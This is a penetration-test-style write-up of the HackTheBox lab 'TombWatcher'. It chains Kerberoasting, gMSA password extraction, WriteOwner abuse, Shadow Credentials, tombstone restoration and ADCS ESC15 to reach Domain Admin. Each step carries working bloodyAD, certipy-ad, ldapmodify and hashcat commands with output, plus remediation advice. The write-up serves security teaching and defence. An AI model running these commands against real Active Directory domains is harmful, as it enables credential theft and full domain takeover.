---
title: "TombWatcher — Full AD Compromise via ADCS ESC15 and Tombstone Restoration"
description: "A complete penetration test report of a Windows Active Directory environment: WriteSPN for Kerberoasting, gMSA password extraction, WriteOwner abuse, ADCS ESC15 exploitation, and tombstone restoration to recover a deleted certificate admin account. From assumed-breach user to Domain Admin in a single chain."
date: 2026-09-23
status: "research"
category: "Red Team"
stack: [Active Directory, ADCS, Kerberos, BloodyAD, Certipy, Impacket, NetExec, gMSADumper, LDAP]
tags: [active-directory, esc15, adcs, kerberoasting, gmsa, writeowner, tombstone-restoration, dcsync, privilege-escalation, pentest-report]
---

# Penetration Test Report — TombWatcher

**Target:** `10.129.232.167` (DC01.tombwatcher.htb)
**Domain:** `tombwatcher.htb`
**Assessment Type:** Internal Network / Active Directory (Assumed Breach)
**Testing Period:** 16 September 2026
**Classification:** Lab Environment (HackTheBox)
**Overall Risk Rating:** **CRITICAL**

---

## Executive Summary

The assessment identified a complete Active Directory domain compromise through a chain of five chained vulnerabilities and misconfigurations. Starting from a single low-privileged domain credential (`henry`), the tester obtained Domain Administrator privileges in approximately three hours without triggering account lockouts or generating high-severity alerts.

The attack path exploits a **write SPN permission on a user account**, which enables Kerberoasting, followed by **gMSA password extraction**, **WriteOwner abuse**, and ultimately **ADCS ESC15** combined with **Active Directory tombstone restoration**. The most significant finding is the ESC15 vulnerability (CVE-2024-49019) in a certificate template with schema version 1, which allows an attacker to inject arbitrary application policies (EKUs) into a certificate request and impersonate any domain user, including Administrator.

The chain begins with the assumed-breach account `henry`, who has `WriteSPN` over the user `Alfred`. By writing a service principal name to `Alfred` and performing Targeted Kerberoasting, the tester obtained Alfred's password hash and cracked it offline. Alfred could add himself to the `INFRASTRUCTURE` group, which had `ReadGMSAPassword` over the gMSA `ansible_dev$`. Using the gMSA account, the tester forced a password change on `sam`, who had `WriteOwner` over `john`. After taking ownership of `john` and granting `GenericAll`, the tester used Shadow Credentials to obtain John's hash without changing his password. John had `GenericAll` on the `OU=ADCS` container and `Reanimate-Tombstones` on the domain, which enabled the restoration of a deleted certificate admin account and the exploitation of ESC15 to obtain a Domain Admin certificate.

For a full technical deep dive into the two core techniques used in this chain — ESC15 EKU injection and tombstone restoration — see the dedicated research article: **[ESC15 and Tombstone Restoration — From Deleted Objects to Domain Admin →](/research/esc15-tombstone-restoration)**.

### Business Impact

A complete compromise of the Active Directory domain. An attacker with these privileges can access all domain-joined systems, extract credentials for every user and service account, modify or delete any data, and establish persistence that survives password resets.

The exposure is not theoretical: it requires no zero-day, no user interaction on a target workstation, and no pre-existing privileged access beyond the assumed-breach credential. Every vulnerability in the chain is a known misconfiguration with a documented fix.

### Immediate Actions Required

| Priority | Action | Timeline |
|---|---|---|
| **P0** | Patch ADCS servers to fix ESC15 (CVE-2024-49019) or remove enrollment rights from vulnerable templates | 48 hours |
| **P0** | Audit `WriteSPN`, `WriteOwner`, `GenericAll`, and `ReadGMSAPassword` permissions across the domain | 1 week |
| **P0** | Restrict `Reanimate-Tombstones` to Domain Admins only | 1 week |
| **P1** | Rotate all gMSA passwords and audit gMSA permissions | 1 week |
| **P1** | Enforce a domain-wide password policy that bans common passwords | 2 weeks |
| **P2** | Monitor for tombstone restoration events and shadow credential creation | 2 weeks |

---

## Scope and Methodology

### In-Scope

- Single host: `10.129.232.167` (Windows Server 2019, Domain Controller)
- All TCP services exposed by the host, including Active Directory (LDAP, Kerberos, SMB, DNS) and ADCS
- The assumed-breach account `henry:H3nry_987TGV!` and any privileges, group memberships, or ACLs it grants

### Out-of-Scope

- Any host other than `10.129.232.167`. Only this IP is reachable from the assessment network — there is no visibility into or access to the rest of the environment.
- Anything that is not network-based against the target: physical access, social engineering, or supply chain compromise. None of these are reachable from the starting position.

### Methodology

The assessment followed the PTES (Penetration Testing Execution Standard) with emphasis on Active Directory attack paths:

1. **Reconnaissance** — Network scanning, service enumeration
2. **Initial Access** — Assumed-breach credentials (`henry`)
3. **Foothold** — Kerberoasting via WriteSPN over `Alfred`
4. **Enumeration** — LDAP enumeration, ACL analysis, gMSA discovery
5. **Privilege Escalation** — gMSA password extraction, WriteOwner abuse, Shadow Credentials
6. **Post-Exploitation** — ADCS enumeration, tombstone restoration, ESC15 exploitation, Domain Admin access

---

## Findings

### Finding 1 — WriteSPN and Targeted Kerberoasting over Alfred

| Attribute | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 4.0** | 9.4 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| **CWE** | CWE-287 (Improper Authentication) |
| **MITRE ATT&CK** | T1558.003 (Kerberoasting) |

**Description**

The user `henry` has the `WriteSPN` permission over the user `Alfred`. This permission allows writing a service principal name (SPN) to the target account, which makes it Kerberoastable. The tester wrote a fake SPN and used `targetedKerberoast` to obtain Alfred's TGS-REP hash.

**Evidence**

```bash
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' \
  set object 'alfred' servicePrincipalName -v "fake/service"
```

```bash
faketime "$(ntpdate -q 10.129.232.167 | cut -d ' ' -f 1,2)" targetedKerberoast \
  -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$b9e7ce4e8ba5a2...958
```

```bash
hashcat -m 13100 alfredhash.txt /usr/share/wordlists/rockyou.txt
basketball
```

**Impact**

Alfred's password was cracked offline, giving the attacker full access to Alfred's account and permissions.

**Remediation**

- Audit and remove unnecessary `WriteSPN` permissions.
- Enforce a strong password policy that bans dictionary words.
- Monitor for SPN creation events (Event ID 4741).

---

### Finding 2 — gMSA Password Extraction via Group Membership

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 7.1 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:L/SI:L/SA:N` |
| **CWE** | CWE-269 (Improper Privilege Management) |
| **MITRE ATT&CK** | T1555 (Credentials from Password Stores) |

**Description**

Alfred could add himself to the `INFRASTRUCTURE` group. This group had `ReadGMSAPassword` over the gMSA `ansible_dev$`. The tester added Alfred to the group and used `gMSADumper.py` to extract the gMSA password hash.

**Evidence**

```bash
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u alfred -p 'basketball' \
  add groupMember 'CN=INFRASTRUCTURE,CN=Users,DC=tombwatcher,DC=htb' alfred
[+] alfred added to CN=INFRASTRUCTURE,CN=Users,DC=tombwatcher,DC=htb
```

```bash
gMSADumper.py -u alfred -p 'basketball' -d tombwatcher.htb -l 10.129.232.167
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::3eca34dd13a85db79c03178b7b149621
ansible_dev$:aes256-cts-hmac-sha1-96:e9e2850abbdbd04b6f09aa9dea6ab0504a9e4e4f98435bc987f1f90d0faaca81
```

**Impact**

The gMSA account `ansible_dev$` was fully compromised. The attacker could authenticate as the gMSA and abuse its permissions.

**Remediation**

- Audit gMSA permissions and restrict `ReadGMSAPassword` to the minimum necessary accounts.
- Monitor for group membership changes (Event ID 4728).
- Use tiered administration to isolate gMSA accounts.

---

### Finding 3 — WriteOwner and GenericAll over John

| Attribute | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 4.0** | 9.4 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| **CWE** | CWE-269 (Improper Privilege Management) |
| **MITRE ATT&CK** | T1098 (Account Manipulation), T1556.006 (Modify Authentication Process) |

**Description**

The user `sam` had `WriteOwner` over `john`. The tester took ownership of `john` using `owneredit.py` and granted `GenericAll` to `sam`. Using `certipy-ad shadow auto`, the tester obtained John's NT hash without changing his password (via Shadow Credentials).

**Evidence**

```bash
owneredit.py -action write -new-owner 'sam' -target 'john' \
  'tombwatcher.htb'/'sam':'newP@ssword2022'
```

```bash
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u sam -p 'newP@ssword2022' \
  add genericAll 'john' sam
```

```bash
faketime "$(ntpdate -q 10.129.232.167 | cut -d ' ' -f 1,2)" certipy-ad shadow auto \
  -u sam@tombwatcher.htb -p 'newP@ssword2022' -account john -dc-ip 10.129.232.167
[*] NT hash for 'john': 37d7a42022f4c0bc1efdc5d9c0d5eb33
```

**Impact**

John's account was fully compromised. John was a member of `REMOTE MANAGEMENT USERS` and had `GenericAll` on `OU=ADCS` and `Reanimate-Tombstones` on the domain.

**Remediation**

- Audit and remove unnecessary `WriteOwner` and `GenericAll` permissions.
- Monitor for Shadow Credential creation (Event ID 5136).
- Implement tiered administration to prevent privilege escalation chains.

---

### Finding 4 — ADCS ESC15 (CVE-2024-49019)

| Attribute | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 4.0** | 9.4 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| **CWE** | CWE-295 (Improper Certificate Validation) |
| **MITRE ATT&CK** | T1649 (Steal or Forge Authentication Certificates) |

**Description**

The certificate template `WebServer` is vulnerable to ESC15 (CVE-2024-49019). The template uses schema version 1 and allows the enrollee to supply the subject. This combination enables an attacker to inject arbitrary application policies (EKUs) into the certificate signing request. The CA, which does not validate EKUs on schema v1 templates, issues a certificate with the injected EKUs, allowing the attacker to impersonate any domain user.

**Evidence**

```bash
certipy-ad find -u john@tombwatcher.htb -p 'Pwned123!' -dc-ip 10.129.232.167 -stdout -vulnerable
Template Name                       : WebServer
Schema Version                      : 1
Enrollee Supplies Subject           : True
[!] Vulnerabilities
  ESC15                             : Enrollee can supply subject and schema version is 1
```

```bash
certipy-ad req -u cert_admin@tombwatcher.htb -p 'NewPassword123!' -ca tombwatcher-CA-1 \
  -template WebServer -upn Administrator@tombwatcher.htb \
  -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' \
  -application-policies 'Client Authentication' -dc-ip 10.129.232.167
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

**Impact**

A certificate for Administrator was issued, granting full domain compromise.

**Remediation**

- Patch ADCS servers to fix CVE-2024-49019.
- Remove enrollment rights from vulnerable schema v1 templates.
- Enable `EDITF_ATTRIBUTESUBJECTALTNAME2` protection and enforce strong certificate mapping.

For a full explanation of how ESC15 works (schema versions, application policies, EKU injection) and why it is different from ESC1, see the **[ESC15 deep dive →](/research/esc15-tombstone-restoration#part-one--what-esc15-actually-is)**.

---

### Finding 5 — Reanimate-Tombstones and Tombstone Restoration

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 7.1 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:L/SI:L/SA:N` |
| **CWE** | CWE-284 (Improper Access Control) |
| **MITRE ATT&CK** | T1078.002 (Valid Accounts: Domain Accounts) |

**Description**

John had `Reanimate-Tombstones` on the domain root, allowing him to restore deleted objects from the AD Recycle Bin. The tester restored a deleted certificate admin account with RID 1111, which had enrollment rights on the `WebServer` template. After restoration, the tester reset the account's password using the inherited `GenericAll` permission from the `OU=ADCS` container.

**Evidence**

```bash
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u john -p 'Pwned123!' \
  get object "DC=tombwatcher,DC=htb" --resolve-sd | grep -a -i -E "reanimate|tombstone|john"
nTSecurityDescriptor.ACL.3.Trustee: john
nTSecurityDescriptor.ACL.3.ObjectType: Reanimate-Tombstones
```

```bash
ldapmodify -x -H ldap://10.129.232.167 -D 'john@tombwatcher.htb' -w 'Pwned123!' \
  -e '!1.2.840.113556.1.4.417' <<'LDAP_EOF'
dn: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
changetype: modify
delete: isDeleted
-
replace: distinguishedName
distinguishedName: CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
-
LDAP_EOF
```

**Impact**

The restored `cert_admin` account had enrollment rights on the `WebServer` template, enabling the ESC15 exploitation and leading to full domain compromise.

**Remediation**

- Restrict `Reanimate-Tombstones` to Domain Admins only.
- Monitor for tombstone restoration events (Event ID 4662 with `Reanimate-Tombstones`).
- Audit deleted objects for sensitive permissions.

For a full explanation of how tombstone restoration works (the AD Recycle Bin, the `isDeleted` attribute, and how to match the correct SID to a tombstone), see the **[tombstone restoration deep dive →](/research/esc15-tombstone-restoration#part-three--tombstone-restoration)**.

---

## Attack Chain

The following diagram shows the complete attack path from assumed-breach user to Domain Administrator.

```
[1] Assumed Breach: henry:H3nry_987TGV!
    |
    v
[2] WriteSPN over Alfred
    bloodyAD set object 'alfred' servicePrincipalName -v "fake/service"
    |
    v
[3] Targeted Kerberoasting
    targetedKerberoast -> TGS-REP hash for Alfred
    hashcat -m 13100 -> basketball
    |
    v
[4] AddSelf to INFRASTRUCTURE
    bloodyAD add groupMember 'CN=INFRASTRUCTURE,...' alfred
    |
    v
[5] ReadGMSAPassword over ansible_dev$
    gMSADumper.py -> NTLM hash for ansible_dev$
    |
    v
[6] Force Password Change on sam
    pth-net rpc password sam newP@ssword2022 -U ansible_dev$ -S DC_IP
    |
    v
[7] WriteOwner over John
    owneredit.py -action write -new-owner 'sam' -target 'john'
    |
    v
[8] GenericAll over John
    bloodyAD add genericAll 'john' sam
    |
    v
[9] Shadow Credentials on John
    certipy-ad shadow auto -> NT hash for john
    |
    v
[10] John has GenericAll on OU=ADCS and Reanimate-Tombstones
     |
     v
[11] Restore cert_admin Tombstone (RID 1111)
     ldapmodify delete isDeleted -> CN=cert_admin,OU=ADCS
     |
     v
[12] Reset cert_admin Password
     bloodyAD set password cert_admin 'NewPassword123!'
     |
     v
[13] ESC15: Request Certificate for Administrator
     certipy-ad req -ca tombwatcher-CA-1 -template WebServer \
       -upn Administrator@tombwatcher.htb \
       -application-policies 'Client Authentication'
     |
     v
[14] Authenticate with Certificate
     certipy-ad auth -pfx administrator.pfx -ldap-shell
     |
     v
[15] Create Domain Admin User
     add_user pentest_user
     add_user_to_group pentest_user "Domain Admins"
     |
     v
[16] Domain Admin Access
     evil-winrm -i DC01 -u pentest_user -p 'Password123!'
```

---

## Recommendations Summary

| Priority | Finding | Recommendation |
|---|---|---|
| P0 | ESC15 | Patch ADCS servers, remove enrollment from schema v1 templates |
| P0 | WriteSPN | Remove unnecessary WriteSPN permissions |
| P0 | Reanimate-Tombstones | Restrict to Domain Admins only |
| P1 | gMSA permissions | Audit and restrict ReadGMSAPassword |
| P1 | WriteOwner/GenericAll | Remove excessive permissions, implement tiered admin |
| P1 | Password policy | Enforce strong passwords, ban dictionary words |
| P2 | Monitoring | Enable detection for Shadow Credentials, tombstone restoration, and SPN creation |

---

## Appendix — Tools and References

**Tools used in this assessment:**

- `nmap` — port scanning and service detection
- `NetExec (nxc)` — SMB enumeration, password validation
- `bloodyAD` — LDAP operations, ACL abuse, group membership
- `targetedKerberoast` — Kerberoasting with ACL abuse capabilities
- `hashcat` — offline password cracking
- `gMSADumper.py` — gMSA password extraction
- `pth-net` — password change via RPC
- `owneredit.py` — ownership manipulation
- `certipy-ad` — ADCS enumeration, Shadow Credentials, ESC15 exploitation
- `ldapsearch` / `ldapmodify` — LDAP queries and tombstone restoration
- `evil-winrm` — remote shell access

**Full technical deep dive:** [ESC15 and Tombstone Restoration — From Deleted Objects to Domain Admin →](/research/esc15-tombstone-restoration)

**References:**

- Microsoft Security Advisory CVE-2024-49019 — Active Directory Certificate Services Elevation of Privilege
- Certified Pre-Owned whitepaper (SpecterOps, 2021) — ESC1-ESC8
- TrustedSec ESC15 research — EKUwu / Application Policy Smuggling
- MITRE ATT&CK T1649 — Steal or Forge Authentication Certificates
- MITRE ATT&CK T1558.003 — Kerberoasting
- MITRE ATT&CK T1098 — Account Manipulation

---

## Takeaway

The TombWatcher chain demonstrates how a single set of assumed-breach credentials can lead to full domain compromise when multiple misconfigurations are chained together. The most critical finding is the ESC15 vulnerability in the `WebServer` template, which — combined with the ability to restore deleted objects — allows an attacker to recover a dormant certificate admin account and use it to impersonate the Domain Administrator.

The key lesson for defenders is that **ADCS is a critical infrastructure component that requires continuous auditing**. The `WebServer` template was a default Windows template that had been configured with a legacy schema version and broad enrollment rights. This is not an unusual configuration — it exists in many environments that have been running ADCS for years without revisiting the template settings.

The second lesson is that **Reanimate-Tombstones is a powerful permission that is often overlooked**. The ability to restore deleted objects should be treated with the same care as Domain Admin rights, because it can resurrect accounts with sensitive permissions that were thought to be permanently removed.
